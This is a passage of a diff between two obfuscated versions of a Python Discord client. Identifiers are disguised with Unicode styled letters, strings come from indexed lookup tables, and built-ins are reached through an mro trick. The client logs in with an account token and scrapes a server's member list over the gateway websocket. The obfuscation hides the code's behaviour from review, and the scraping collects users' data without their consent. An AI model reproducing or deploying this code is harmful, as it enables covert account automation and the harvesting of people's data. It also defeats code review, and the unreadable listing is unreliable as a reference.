+            if 𝘤𝘩𝘶𝙣𝘬[𝗜𝗡𝙄𝘕𝙡𝘭𝗜𝙈𝘐𝙄𝗹𝘔𝙡𝙡𝙄𝘭𝗹𝗡𝘕𝗜𝗹𝙡𝘔𝘕𝗹𝙉𝙡𝙈𝗜𝘔𝘐𝘔[169]] in (𝗜𝗡𝙄𝙉𝙡𝗹𝗜𝗠𝘐𝗜𝗹𝗠𝙡𝗹𝗜𝘭𝗹𝗡𝙉𝘐𝘭𝘭𝘔𝘕𝘭𝗡𝘭𝗠𝗜𝙈𝙄𝗠[170], 𝙄𝙉𝘐𝗡𝘭𝙡𝗜𝗠𝘐𝙄𝙡𝙈𝘭𝘭𝘐𝙡𝘭𝘕𝘕𝘐𝗹𝗹𝗠𝘕𝘭𝘕𝘭𝘔𝘐𝘔𝙄𝘔[171]):
+                𝙢𝗲𝘮𝗯𝗲𝗿𝙙𝘢𝘵𝙖[𝗜𝘕𝙄𝗡𝗹𝙡𝘐𝗠𝘐𝘐𝙡𝗠𝘭𝙡𝙄𝗹𝙡𝘕𝘕𝗜𝘭𝙡𝘔𝗡𝙡𝘕𝗹𝘔𝘐𝘔𝙄𝗠[164]].append(𝘤𝗵𝙪𝗻𝙠[𝙄𝘕𝘐𝙉𝘭𝘭𝘐𝗠𝗜𝗜𝙡𝘔𝙡𝘭𝘐𝘭𝘭𝗡𝙉𝘐𝙡𝘭𝗠𝗡𝘭𝘕𝗹𝗠𝘐𝗠𝗜𝘔[172]])
+                if 𝗰𝙝𝙪𝘯𝘬[𝙄𝘕𝗜𝙉𝘭𝗹𝙄𝙈𝘐𝗜𝗹𝘔𝘭𝘭𝘐𝙡𝙡𝗡𝙉𝗜𝘭𝗹𝗠𝗡𝗹𝘕𝗹𝙈𝘐𝘔𝙄𝗠[169]] == 𝙄𝘕𝗜𝘕𝗹𝙡𝘐𝙈𝗜𝘐𝘭𝘔𝙡𝘭𝗜𝗹𝘭𝘕𝙉𝘐𝗹𝘭𝙈𝙉𝗹𝙉𝙡𝗠𝘐𝙈𝙄𝙈[170]:
+                    𝗺𝗲𝙢𝗯𝙚𝙧𝗱𝗮𝘵𝙖[𝘐𝙉𝗜𝙉𝗹𝗹𝘐𝘔𝗜𝗜𝗹𝗠𝗹𝘭𝘐𝙡𝘭𝙉𝗡𝙄𝙡𝗹𝘔𝗡𝘭𝙉𝗹𝙈𝘐𝙈𝗜𝙈[165]].append(𝗰𝘩𝙪𝗻𝘬[𝘐𝗡𝗜𝘕𝘭𝙡𝙄𝘔𝙄𝗜𝘭𝗠𝙡𝘭𝙄𝘭𝗹𝙉𝗡𝗜𝙡𝗹𝗠𝙉𝗹𝘕𝙡𝗠𝙄𝗠𝙄𝙈[173]])
                 else:
-                    𝙢𝗲𝗺𝘣𝘦𝗿𝘥𝙖𝘁𝗮[𝙉𝗠𝘔𝗠𝗡𝙡𝗹𝗠𝗠𝙡𝗠𝗠𝗡𝘭𝗜𝘔𝗜𝙄𝘕𝗠𝗜𝘐𝘔𝘐𝘭𝘐𝘕𝙄𝘔𝙄𝙄𝙈[172]].append([])
-            elif 𝙘𝗵𝘂𝘯𝙠[𝙉𝗠𝙈𝗠𝗡𝘭𝗹𝗠𝗠𝗹𝙈𝘔𝗡𝙡𝗜𝗠𝙄𝘐𝘕𝗠𝙄𝗜𝙈𝙄𝗹𝗜𝘕𝙄𝙈𝘐𝘐𝘔[176]] in (𝘕𝙈𝙈𝗠𝗡𝗹𝘭𝙈𝙈𝗹𝘔𝙈𝗡𝗹𝙄𝙈𝙄𝘐𝗡𝘔𝘐𝘐𝗠𝗜𝙡𝘐𝙉𝙄𝘔𝘐𝘐𝘔[181], 𝙉𝘔𝘔𝙈𝘕𝘭𝗹𝙈𝗠𝙡𝙈𝗠𝙉𝘭𝗜𝙈𝙄𝙄𝘕𝗠𝙄𝘐𝗠𝘐𝙡𝘐𝘕𝘐𝗠𝙄𝘐𝘔[182], 𝙉𝘔𝙈𝘔𝙉𝙡𝘭𝘔𝗠𝗹𝙈𝙈𝗡𝙡𝘐𝙈𝘐𝗜𝗡𝘔𝙄𝙄𝘔𝘐𝙡𝙄𝘕𝘐𝗠𝙄𝗜𝘔[183]):
-                𝙢𝙚𝙢𝙗𝘦𝘳𝗱𝙖𝘁𝗮[𝘕𝗠𝗠𝙈𝙉𝘭𝗹𝘔𝙈𝙡𝘔𝘔𝙉𝘭𝘐𝙈𝙄𝘐𝗡𝘔𝙄𝗜𝙈𝗜𝙡𝘐𝗡𝘐𝙈𝘐𝘐𝘔[171]].append(𝗰𝘩𝘶𝙣𝙠[𝙉𝗠𝙈𝘔𝗡𝘭𝘭𝗠𝘔𝙡𝗠𝘔𝙉𝘭𝘐𝗠𝗜𝙄𝙉𝙈𝗜𝗜𝗠𝘐𝘭𝙄𝙉𝘐𝘔𝙄𝗜𝗠[184]])
-                if 𝘤𝘩𝘂𝘯𝙠[𝘕𝙈𝘔𝙈𝗡𝗹𝙡𝗠𝙈𝗹𝙈𝙈𝘕𝙡𝘐𝙈𝙄𝙄𝙉𝗠𝙄𝗜𝙈𝗜𝙡𝙄𝘕𝘐𝗠𝙄𝙄𝗠[176]] == 𝙉𝗠𝙈𝗠𝗡𝘭𝙡𝙈𝗠𝗹𝙈𝘔𝗡𝘭𝙄𝗠𝗜𝙄𝗡𝘔𝗜𝘐𝗠𝙄𝘭𝘐𝙉𝗜𝘔𝙄𝙄𝙈[183]:
-                    𝘮𝗲𝗺𝘣𝘦𝙧𝘥𝗮𝘵𝗮[𝘕𝘔𝘔𝙈𝘕𝗹𝗹𝙈𝗠𝗹𝘔𝗠𝗡𝘭𝙄𝘔𝗜𝙄𝙉𝙈𝙄𝗜𝗠𝘐𝗹𝗜𝘕𝙄𝗠𝙄𝘐𝗠[172]].append([])
+                    𝘮𝘦𝙢𝗯𝙚𝗿𝗱𝘢𝘵𝘢[𝙄𝘕𝗜𝙉𝙡𝗹𝙄𝗠𝙄𝙄𝘭𝘔𝘭𝙡𝘐𝘭𝘭𝗡𝗡𝙄𝗹𝙡𝗠𝘕𝘭𝘕𝘭𝙈𝗜𝙈𝗜𝙈[165]].append([])
+            elif 𝘤𝗵𝙪𝗻𝘬[𝙄𝙉𝘐𝗡𝙡𝗹𝗜𝙈𝙄𝙄𝘭𝗠𝗹𝘭𝗜𝘭𝗹𝙉𝘕𝗜𝙡𝘭𝘔𝘕𝗹𝘕𝘭𝘔𝗜𝗠𝘐𝗠[169]] in (𝗜𝙉𝙄𝙉𝘭𝙡𝗜𝘔𝙄𝗜𝘭𝘔𝙡𝗹𝘐𝗹𝗹𝘕𝘕𝗜𝗹𝙡𝗠𝙉𝘭𝘕𝘭𝙈𝗜𝘔𝙄𝗠[174], 𝙄𝗡𝗜𝘕𝙡𝘭𝘐𝘔𝘐𝙄𝙡𝘔𝘭𝗹𝙄𝗹𝘭𝙉𝙉𝘐𝘭𝙡𝙈𝘕𝘭𝗡𝙡𝘔𝗜𝙈𝗜𝙈[175], 𝘐𝘕𝗜𝙉𝘭𝘭𝙄𝙈𝘐𝘐𝙡𝘔𝗹𝙡𝗜𝘭𝗹𝘕𝗡𝘐𝙡𝙡𝘔𝘕𝘭𝘕𝙡𝘔𝗜𝗠𝗜𝘔[176]):
+                𝗺𝘦𝘮𝙗𝘦𝙧𝗱𝗮𝘵𝘢[𝗜𝙉𝗜𝘕𝗹𝗹𝗜𝘔𝘐𝘐𝗹𝗠𝗹𝘭𝙄𝗹𝘭𝘕𝗡𝗜𝙡𝙡𝗠𝘕𝗹𝙉𝙡𝘔𝙄𝙈𝘐𝗠[164]].append(𝘤𝗵𝙪𝘯𝗸[𝗜𝙉𝗜𝘕𝙡𝘭𝗜𝘔𝙄𝗜𝘭𝘔𝗹𝘭𝗜𝙡𝘭𝙉𝘕𝗜𝘭𝙡𝘔𝘕𝗹𝘕𝘭𝗠𝗜𝘔𝗜𝘔[177]])
+                if 𝗰𝘩𝘶𝙣𝗸[𝘐𝘕𝙄𝘕𝘭𝘭𝘐𝘔𝘐𝙄𝗹𝙈𝗹𝙡𝘐𝗹𝗹𝗡𝗡𝗜𝙡𝗹𝘔𝗡𝘭𝗡𝙡𝗠𝘐𝘔𝘐𝘔[169]] == 𝙄𝗡𝘐𝘕𝙡𝙡𝗜𝙈𝗜𝙄𝙡𝗠𝘭𝘭𝗜𝗹𝘭𝘕𝙉𝘐𝘭𝙡𝗠𝗡𝘭𝙉𝗹𝗠𝘐𝗠𝘐𝘔[176]:
+                    𝙢𝘦𝙢𝘣𝗲𝗿𝗱𝘢𝘵𝘢[𝗜𝗡𝘐𝙉𝗹𝙡𝗜𝙈𝙄𝗜𝘭𝘔𝘭𝗹𝙄𝗹𝙡𝙉𝘕𝘐𝗹𝗹𝙈𝘕𝘭𝙉𝙡𝘔𝗜𝙈𝘐𝘔[165]].append([])
                 else:
-                    𝘮𝘦𝗺𝙗𝘦𝗿𝗱𝗮𝙩𝗮[𝘕𝗠𝘔𝙈𝗡𝗹𝗹𝘔𝘔𝗹𝘔𝙈𝙉𝘭𝗜𝘔𝘐𝙄𝙉𝗠𝙄𝗜𝙈𝙄𝘭𝗜𝙉𝘐𝗠𝙄𝗜𝘔[172]].append(𝙘𝙝𝘶𝙣𝘬[𝘕𝗠𝗠𝙈𝙉𝙡𝘭𝗠𝗠𝙡𝘔𝗠𝗡𝘭𝙄𝗠𝘐𝗜𝗡𝗠𝗜𝘐𝗠𝙄𝙡𝘐𝘕𝗜𝘔𝘐𝘐𝗠[185]])
-        return 𝗺𝙚𝘮𝘣𝙚𝘳𝘥𝘢𝘵𝗮
+                    𝗺𝘦𝘮𝘣𝗲𝘳𝙙𝘢𝘵𝗮[𝘐𝘕𝙄𝘕𝘭𝗹𝗜𝙈𝗜𝘐𝗹𝘔𝗹𝘭𝘐𝘭𝘭𝙉𝘕𝙄𝗹𝘭𝙈𝘕𝗹𝘕𝘭𝘔𝙄𝘔𝙄𝘔[165]].append(𝙘𝙝𝘶𝘯𝗸[𝘐𝘕𝗜𝗡𝙡𝘭𝘐𝙈𝙄𝙄𝙡𝙈𝙡𝘭𝗜𝙡𝗹𝗡𝗡𝗜𝗹𝘭𝙈𝙉𝙡𝙉𝙡𝙈𝗜𝗠𝘐𝙈[178]])
+        return 𝘮𝙚𝗺𝘣𝗲𝘳𝗱𝗮𝘁𝘢
 
-class DiscordSocket(𝘄𝘦𝘣𝘀𝘰𝙘𝘬𝘦𝙩.WebSocketApp):
+class DiscordSocket(𝘸𝙚𝙗𝙨𝘰𝘤𝙠𝗲𝘁.WebSocketApp):
 
     def __init__(self, token, guild_id, channel_id):
-        𝙨𝘦𝘁𝙖𝙩𝘁𝙧(𝙨𝙚𝙡𝙛, 'token', 𝘵𝘰𝙠𝘦𝗻)
-        𝘴𝘦𝘁𝗮𝙩𝙩𝗿(𝘴𝗲𝗹𝙛, 'guild_id', 𝗴𝙪𝘪𝗹𝗱_𝘪𝘥)
-        𝘴𝙚𝘁𝙖𝘁𝘁𝙧(𝙨𝗲𝙡𝗳, 'channel_id', 𝙘𝙝𝙖𝙣𝙣𝙚𝗹_𝗶𝘥)
-        𝙨𝗲𝘭𝗳.blacklisted_roles, 𝘴𝙚𝘭𝙛.blacklisted_users = ([], [])
-        𝘴𝙚𝙩𝘢𝘵𝘵𝙧(𝘴𝘦𝘭𝘧, 'socket_headers', {𝘕𝘔𝗠𝙈𝗡𝙡𝙡𝘔𝘔𝙡𝘔𝗠𝗡𝘭𝘐𝘔𝙄𝗜𝘕𝘔𝗜𝗜𝘔𝙄𝘭𝗜𝘕𝙄𝘔𝗜𝘐𝙈[186]: 𝗡𝙈𝗠𝘔𝙉𝗹𝗹𝗠𝘔𝗹𝙈𝙈𝘕𝙡𝙄𝘔𝙄𝘐𝙉𝙈𝘐𝙄𝗠𝙄𝙡𝘐𝙉𝗜𝘔𝘐𝙄𝗠[192], 𝘕𝙈𝙈𝘔𝗡𝘭𝙡𝗠𝗠𝙡𝘔𝗠𝘕𝙡𝘐𝙈𝘐𝗜𝙉𝙈𝘐𝗜𝘔𝗜𝗹𝘐𝘕𝗜𝙈𝙄𝙄𝙈[187]: 𝘕𝘔𝗠𝘔𝙉𝗹𝘭𝗠𝗠𝙡𝙈𝘔𝘕𝗹𝗜𝗠𝙄𝘐𝘕𝗠𝘐𝗜𝗠𝙄𝙡𝗜𝗡𝙄𝙈𝙄𝙄𝗠[193], 𝗡𝙈𝙈𝗠𝗡𝙡𝘭𝗠𝙈𝗹𝙈𝗠𝙉𝗹𝗜𝗠𝘐𝗜𝙉𝙈𝙄𝙄𝗠𝙄𝘭𝗜𝙉𝙄𝘔𝘐𝗜𝗠[188]: 𝗡𝙈𝙈𝙈𝙉𝗹𝘭𝘔𝘔𝘭𝙈𝘔𝙉𝗹𝘐𝘔𝘐𝘐𝗡𝙈𝙄𝘐𝙈𝙄𝙡𝘐𝗡𝗜𝗠𝘐𝙄𝙈[194], 𝙉𝙈𝙈𝘔𝘕𝘭𝙡𝗠𝗠𝘭𝗠𝘔𝘕𝘭𝗜𝙈𝘐𝗜𝗡𝗠𝗜𝗜𝗠𝙄𝘭𝘐𝗡𝘐𝙈𝗜𝘐𝗠[189]: 𝙉𝗠𝙈𝗠𝗡𝘭𝙡𝘔𝙈𝙡𝗠𝗠𝙉𝙡𝘐𝗠𝘐𝙄𝙉𝙈𝘐𝙄𝗠𝘐𝘭𝙄𝙉𝘐𝙈𝗜𝙄𝘔[194], 𝗡𝘔𝗠𝘔𝙉𝘭𝘭𝙈𝗠𝘭𝘔𝗠𝗡𝘭𝙄𝗠𝙄𝗜𝘕𝗠𝘐𝘐𝙈𝗜𝘭𝗜𝙉𝘐𝗠𝘐𝘐𝗠[190]: 𝙉𝙈𝗠𝘔𝙉𝗹𝙡𝘔𝗠𝗹𝘔𝙈𝘕𝘭𝗜𝙈𝗜𝘐𝗡𝙈𝗜𝙄𝗠𝘐𝙡𝘐𝗡𝙄𝘔𝙄𝗜𝙈[195], 𝙉𝗠𝘔𝗠𝗡𝙡𝘭𝗠𝙈𝗹𝗠𝘔𝗡𝙡𝘐𝘔𝗜𝙄𝗡𝙈𝙄𝗜𝘔𝙄𝙡𝗜𝙉𝘐𝙈𝘐𝘐𝗠[191]: 𝙉𝙈𝗠𝘔𝙉𝗹𝙡𝗠𝗠𝘭𝗠𝘔𝙉𝗹𝙄𝘔𝗜𝗜𝘕𝙈𝙄𝘐𝗠𝙄𝗹𝙄𝗡𝙄𝙈𝘐𝙄𝗠[196]})
-        𝘴𝘂𝙥𝘦𝘳().__init__(𝘕𝗠𝙈𝘔𝗡𝘭𝘭𝘔𝘔𝗹𝘔𝙈𝘕𝙡𝙄𝙈𝘐𝘐𝘕𝘔𝘐𝙄𝗠𝘐𝘭𝙄𝘕𝗜𝗠𝘐𝙄𝘔[197], header=𝙨𝙚𝙡𝙛.socket_headers, on_open=lambda ws: 𝘀𝘦𝙡𝗳.sock_open(𝘄𝙨), on_message=lambda ws, msg: 𝘴𝗲𝗹𝘧.sock_message(𝘸𝘴, 𝘮𝙨𝙜), on_close=lambda ws, close_code, close_msg: 𝘀𝙚𝘭𝘧.sock_close(𝘄𝘀, 𝘤𝗹𝗼𝘀𝙚_𝙘𝘰𝙙𝙚, 𝗰𝘭𝗼𝘀𝘦_𝙢𝘴𝘨))
-        𝘀𝘦𝘁𝙖𝘵𝙩𝙧(𝘀𝘦𝘭𝗳, 'endScraping', False)
-        𝙨𝗲𝙩𝗮𝙩𝘵𝘳(𝘴𝗲𝗹𝘧, 'guilds', {})
-        𝘴𝗲𝘁𝗮𝘁𝘵𝙧(𝘀𝘦𝘭𝘧, 'members', {})
-        𝙨𝘦𝘁𝘢𝙩𝘵𝙧(𝘀𝗲𝙡𝙛, 'ranges', [[0, 0]])
-        𝙨𝘦𝘁𝙖𝘵𝘵𝗿(𝙨𝘦𝗹𝗳, 'lastRange', 0)
-        𝘴𝘦𝘵𝘢𝘵𝘁𝙧(𝘀𝗲𝗹𝙛, 'packets_recv', 0)
+        𝙨𝗲𝘁𝘢𝘁𝘵𝘳(𝙨𝙚𝗹𝗳, 'token', 𝘵𝘰𝗸𝗲𝘯)
+        𝘀𝙚𝘵𝘢𝘁𝘁𝙧(𝘀𝘦𝘭𝙛, 'guild_id', 𝘨𝙪𝘪𝗹𝙙_𝘪𝙙)
+        𝘀𝘦𝘁𝙖𝘁𝙩𝗿(𝘀𝘦𝙡𝘧, 'channel_id', 𝘤𝗵𝗮𝙣𝙣𝙚𝘭_𝙞𝙙)
+        𝘀𝘦𝗹𝗳.blacklisted_roles, 𝘴𝘦𝘭𝗳.blacklisted_users = ([], [])
+        𝙨𝘦𝙩𝗮𝘵𝘵𝗿(𝙨𝘦𝙡𝙛, 'socket_headers', {𝗜𝙉𝗜𝘕𝗹𝗹𝘐𝗠𝘐𝘐𝘭𝘔𝙡𝗹𝘐𝗹𝙡𝘕𝗡𝗜𝙡𝗹𝗠𝘕𝘭𝗡𝗹𝗠𝙄𝗠𝘐𝗠[179]: 𝙄𝗡𝙄𝙉𝙡𝘭𝙄𝘔𝘐𝙄𝙡𝗠𝗹𝘭𝘐𝙡𝙡𝙉𝘕𝘐𝗹𝙡𝗠𝘕𝘭𝙉𝗹𝗠𝘐𝙈𝙄𝘔[185], 𝙄𝘕𝙄𝙉𝙡𝗹𝘐𝘔𝗜𝗜𝙡𝙈𝗹𝙡𝘐𝘭𝗹𝗡𝗡𝘐𝗹𝗹𝗠𝗡𝘭𝘕𝗹𝘔𝗜𝗠𝙄𝙈[180]: 𝙄𝗡𝗜𝙉𝘭𝗹𝘐𝗠𝙄𝗜𝙡𝘔𝗹𝙡𝙄𝗹𝙡𝙉𝙉𝗜𝘭𝙡𝗠𝙉𝘭𝗡𝘭𝗠𝘐𝗠𝙄𝙈[186], 𝘐𝙉𝙄𝙉𝙡𝘭𝗜𝗠𝗜𝙄𝗹𝗠𝙡𝙡𝘐𝘭𝘭𝘕𝘕𝗜𝗹𝘭𝙈𝗡𝘭𝘕𝗹𝘔𝗜𝘔𝗜𝙈[181]: 𝘐𝙉𝘐𝗡𝗹𝙡𝙄𝘔𝘐𝙄𝙡𝘔𝗹𝘭𝗜𝗹𝙡𝙉𝘕𝗜𝘭𝘭𝙈𝘕𝗹𝙉𝘭𝘔𝗜𝘔𝘐𝘔[187], 𝘐𝗡𝘐𝗡𝙡𝙡𝘐𝘔𝙄𝘐𝗹𝗠𝗹𝘭𝙄𝘭𝘭𝘕𝗡𝗜𝗹𝗹𝙈𝙉𝙡𝙉𝙡𝙈𝗜𝗠𝗜𝘔[182]: 𝗜𝗡𝗜𝙉𝗹𝗹𝙄𝙈𝙄𝘐𝗹𝘔𝗹𝗹𝙄𝗹𝗹𝗡𝙉𝗜𝗹𝙡𝗠𝙉𝘭𝗡𝘭𝙈𝗜𝙈𝙄𝙈[187], 𝗜𝙉𝗜𝗡𝘭𝙡𝘐𝙈𝘐𝗜𝗹𝗠𝘭𝙡𝗜𝙡𝙡𝙉𝘕𝘐𝙡𝙡𝘔𝗡𝗹𝘕𝙡𝘔𝘐𝙈𝗜𝘔[183]: 𝗜𝙉𝗜𝙉𝗹𝙡𝙄𝙈𝘐𝗜𝗹𝘔𝙡𝗹𝘐𝘭𝗹𝘕𝗡𝗜𝗹𝘭𝘔𝗡𝗹𝗡𝗹𝘔𝙄𝙈𝘐𝘔[188], 𝙄𝙉𝗜𝗡𝘭𝙡𝙄𝗠𝙄𝘐𝗹𝙈𝙡𝙡𝙄𝘭𝙡𝘕𝙉𝙄𝙡𝙡𝙈𝙉𝙡𝘕𝘭𝘔𝘐𝘔𝘐𝙈[184]: 𝘐𝗡𝙄𝗡𝘭𝗹𝙄𝙈𝗜𝗜𝗹𝗠𝙡𝙡𝘐𝗹𝙡𝘕𝘕𝘐𝙡𝗹𝙈𝙉𝘭𝙉𝘭𝙈𝘐𝘔𝗜𝘔[189]})
+        𝘴𝙪𝘱𝙚𝘳().__init__(𝘐𝘕𝘐𝙉𝘭𝗹𝘐𝘔𝗜𝙄𝙡𝗠𝗹𝙡𝘐𝙡𝗹𝗡𝘕𝗜𝙡𝘭𝙈𝙉𝘭𝗡𝘭𝙈𝘐𝗠𝘐𝗠[190], header=𝙨𝙚𝙡𝘧.socket_headers, on_open=lambda ws: 𝘴𝙚𝘭𝘧.sock_open(𝙬𝘀), on_message=lambda ws, msg: 𝘴𝙚𝘭𝗳.sock_message(𝙬𝙨, 𝙢𝘀𝗴), on_close=lambda ws, close_code, close_msg: 𝙨𝙚𝙡𝗳.sock_close(𝘄𝘴, 𝗰𝘭𝗼𝘀𝗲_𝘤𝙤𝙙𝘦, 𝘤𝗹𝙤𝘴𝗲_𝙢𝙨𝗴))
+        𝘴𝙚𝙩𝘢𝘵𝘵𝙧(𝙨𝗲𝙡𝗳, 'endScraping', False)
+        𝙨𝘦𝘵𝘢𝘁𝙩𝙧(𝘴𝗲𝘭𝗳, 'guilds', {})
+        𝙨𝙚𝘁𝙖𝙩𝘵𝘳(𝘀𝗲𝙡𝗳, 'members', {})
+        𝘴𝙚𝘵𝗮𝘵𝘁𝗿(𝙨𝗲𝙡𝘧, 'ranges', [[0, 0]])
+        𝘴𝘦𝘵𝙖𝘵𝙩𝙧(𝘴𝘦𝘭𝘧, 'lastRange', 0)
+        𝘀𝙚𝘵𝘢𝘵𝘁𝘳(𝘀𝘦𝘭𝗳, 'packets_recv', 0)
 
     def run(self):
-        𝙨𝙚𝘭𝘧.run_forever()
-        return 𝘀𝘦𝙡𝗳.members
+        𝘴𝘦𝗹𝗳.run_forever()
+        return 𝘀𝘦𝘭𝗳.members
 
     def scrapeUsers(self):
-        if 𝘴𝙚𝙡𝙛.endScraping == False:
-            𝘀𝙚𝙡𝙛.send(𝘕𝘔𝙈𝙈𝗡𝙡𝙡𝗠𝘔𝘭𝗠𝘔𝗡𝘭𝙄𝙈𝙄𝘐𝙉𝘔𝗜𝗜𝗠𝘐𝗹𝙄𝗡𝗜𝘔𝘐𝘐𝙈[198] + 𝙨𝘦𝗹𝙛.guild_id + 𝙉𝘔𝘔𝘔𝗡𝙡𝘭𝗠𝙈𝘭𝙈𝘔𝘕𝘭𝙄𝗠𝘐𝗜𝘕𝗠𝙄𝙄𝗠𝗜𝙡𝙄𝙉𝙄𝙈𝘐𝙄𝗠[199] + 𝘴𝘦𝗹𝘧.channel_id + 𝙉𝙈𝗠𝙈𝙉𝗹𝗹𝘔𝙈𝘭𝙈𝘔𝘕𝘭𝘐𝙈𝘐𝗜𝙉𝙈𝙄𝘐𝘔𝗜𝙡𝙄𝘕𝘐𝗠𝘐𝙄𝗠[200] + 𝗷𝘀𝘰𝘯.dumps(𝙨𝗲𝙡𝙛.ranges) + 𝗡𝙈𝗠𝘔𝘕𝙡𝗹𝗠𝙈𝘭𝙈𝘔𝗡𝙡𝙄𝗠𝘐𝙄𝗡𝘔𝗜𝗜𝙈𝗜𝗹𝘐𝙉𝗜𝙈𝗜𝙄𝙈[201])
+        if 𝘴𝘦𝘭𝙛.endScraping == False:
+            𝘴𝙚𝙡𝙛.send(𝘐𝙉𝘐𝘕𝘭𝘭𝘐𝙈𝗜𝙄𝙡𝘔𝙡𝗹𝙄𝙡𝘭𝙉𝗡𝗜𝙡𝙡𝘔𝙉𝘭𝙉𝘭𝗠𝘐𝘔𝙄𝘔[191] + 𝙨𝙚𝘭𝘧.guild_id + 𝘐𝗡𝘐𝘕𝘭𝙡𝘐𝗠𝗜𝙄𝘭𝗠𝘭𝗹𝙄𝙡𝗹𝘕𝗡𝙄𝘭𝘭𝗠𝙉𝘭𝙉𝙡𝗠𝙄𝘔𝙄𝘔[192] + 𝘀𝗲𝗹𝙛.channel_id + 𝘐𝗡𝗜𝙉𝘭𝘭𝗜𝙈𝙄𝙄𝙡𝗠𝗹𝙡𝙄𝙡𝙡𝙉𝘕𝙄𝙡𝗹𝙈𝗡𝘭𝗡𝙡𝙈𝙄𝙈𝘐𝘔[193] + 𝘫𝘀𝘰𝙣.dumps(𝙨𝗲𝙡𝘧.ranges) + 𝙄𝙉𝘐𝗡𝘭𝘭𝗜𝙈𝘐𝘐𝘭𝗠𝘭𝘭𝙄𝗹𝘭𝗡𝘕𝗜𝙡𝙡𝗠𝗡𝗹𝘕𝘭𝘔𝗜𝙈𝘐𝙈[194])
 
     def sock_open(self, ws):
-        𝘀𝙚𝙡𝗳.send(𝘕𝙈𝘔𝙈𝘕𝙡𝗹𝙈𝙈𝗹𝗠𝙈𝘕𝙡𝗜𝘔𝘐𝙄𝗡𝘔𝗜𝙄𝘔𝘐𝙡𝗜𝗡𝙄𝙈𝘐𝗜𝘔[202] + 𝘀𝘦𝙡𝙛.token + 𝙉𝘔𝘔𝘔𝗡𝗹𝘭𝗠𝘔𝗹𝗠𝗠𝙉𝘭𝗜𝘔𝙄𝗜𝘕𝗠𝘐𝙄𝙈𝗜𝗹𝗜𝗡𝗜𝙈𝙄𝘐𝙈[203])
+        𝘀𝘦𝙡𝗳.send(𝗜𝘕𝙄𝘕𝗹𝘭𝙄𝗠𝙄𝘐𝙡𝙈𝗹𝗹𝗜𝙡𝘭𝙉𝙉𝗜𝗹𝗹𝗠𝙉𝘭𝙉𝙡𝙈𝙄𝘔𝗜𝙈[195] + 𝘀𝙚𝘭𝙛.token + 𝙄𝘕𝘐𝙉𝘭𝙡𝘐𝗠𝘐𝘐𝗹𝙈𝗹𝘭𝙄𝙡𝗹𝙉𝙉𝗜𝘭𝙡𝙈𝘕𝘭𝙉𝘭𝗠𝘐𝙈𝘐𝘔[196])
 
     def heartbeatThread(self, interval):
         try:
             while True:
-                𝘴𝗲𝙡𝘧.send(𝗡𝗠𝗠𝘔𝙉𝙡𝙡𝙈𝗠𝙡𝗠𝘔𝙉𝗹𝘐𝘔𝘐𝗜𝗡𝙈𝙄𝙄𝙈𝗜𝗹𝙄𝘕𝘐𝙈𝗜𝙄𝘔[204] + 𝙭𝙨𝘘5𝘈𝘝𝙆𝘤𝙑𝘾𝗪𝗛1𝗦𝙩𝗨𝗥𝗖𝘥𝘠2𝗘𝙐𝗟𝘋1𝘅2𝗸6𝘫𝙡.mro()[6](𝘀𝘦𝘭𝗳.packets_recv) + 𝘕𝗠𝙈𝗠𝙉𝘭𝗹𝗠𝙈𝙡𝙈𝘔𝗡𝗹𝘐𝘔𝙄𝗜𝘕𝙈𝙄𝙄𝘔𝘐𝙡𝙄𝗡𝙄𝗠𝗜𝙄𝙈[205])
-                𝘵𝘪𝗺𝗲.sleep(𝗶𝙣𝘵𝘦𝘳𝘃𝗮𝗹)
-        except 𝗘𝙭𝙘𝘦𝗽𝙩𝙞𝘰𝗻 as e:
+                𝙨𝗲𝙡𝘧.send(𝗜𝙉𝗜𝗡𝗹𝘭𝙄𝙈𝗜𝗜𝙡𝗠𝘭𝙡𝘐𝙡𝙡𝗡𝘕𝙄𝙡𝗹𝙈𝗡𝙡𝘕𝗹𝙈𝘐𝗠𝙄𝙈[197] + 𝗳𝙄𝘇𝙫9𝘀6𝗕𝗘9𝘴𝘡3𝙬𝙕𝗔0𝙝𝙞2𝙬𝗶5𝗟8𝙖790𝗝6𝗱.mro()[6](𝘴𝙚𝗹𝘧.packets_recv) + 𝗜𝗡𝙄𝙉𝗹𝗹𝗜𝙈𝙄𝙄𝘭𝗠𝗹𝗹𝘐𝘭𝗹𝙉𝙉𝗜𝘭𝗹𝙈𝗡𝘭𝗡𝘭𝘔𝘐𝙈𝗜𝘔[198])
+                𝘵𝗶𝙢𝘦.sleep(𝗶𝙣𝘁𝘦𝘳𝘃𝘢𝙡)
+        except 𝘌𝘅𝘤𝙚𝙥𝙩𝗶𝗼𝗻 as e:
             pass
             return
 
     def sock_message(self, ws, message):
-        𝘥𝘦𝘤𝙤𝙙𝙚𝘥 = 𝗷𝘴𝙤𝘯.loads(𝙢𝗲𝙨𝙨𝘢𝙜𝗲)
-        if 𝗱𝙚𝙘𝙤𝗱𝗲𝘥 is None:
+        𝗱𝗲𝙘𝗼𝗱𝘦𝘥 = 𝗷𝘀𝗼𝙣.loads(𝘮𝗲𝘀𝘴𝘢𝗴𝘦)
+        if 𝙙𝙚𝘤𝗼𝙙𝗲𝘥 is None:
             return
-        if 𝙙𝗲𝘤𝗼𝙙𝙚𝘥[𝗡𝙈𝘔𝙈𝙉𝗹𝗹𝗠𝘔𝗹𝗠𝗠𝙉𝗹𝘐𝙈𝗜𝘐𝘕𝘔𝗜𝙄𝗠𝘐𝗹𝙄𝗡𝗜𝗠𝙄𝘐𝗠[176]] != 11:
-            𝘴𝗲𝙡𝗳.packets_recv += 1
-        if 𝗱𝘦𝗰𝗼𝙙𝗲𝙙[𝘕𝗠𝘔𝗠𝘕𝙡𝗹𝙈𝘔𝗹𝗠𝘔𝙉𝘭𝘐𝗠𝙄𝗜𝗡𝘔𝙄𝘐𝗠𝘐𝗹𝗜𝗡𝘐𝘔𝗜𝙄𝘔[176]] == 10:
-            𝙩𝙝𝙧𝙚𝗮𝘥𝗶𝗻𝘨.Thread(target=𝘴𝗲𝙡𝘧.heartbeatThread, args=(𝘥𝙚𝗰𝘰𝘥𝗲𝗱[𝘕𝗠𝗠𝗠𝘕𝘭𝘭𝗠𝘔𝗹𝗠𝗠𝘕𝙡𝘐𝘔𝘐𝙄𝘕𝙈𝗜𝙄𝙈𝘐𝘭𝘐𝙉𝘐𝘔𝘐𝘐𝘔[173]][𝘕𝙈𝗠𝘔𝙉𝗹𝘭𝙈𝘔𝙡𝘔𝙈𝘕𝘭𝗜𝗠𝗜𝘐𝗡𝙈𝙄𝘐𝗠𝗜𝗹𝙄𝘕𝗜𝗠𝗜𝗜𝘔[206]] / 1000,), daemon=True).start()
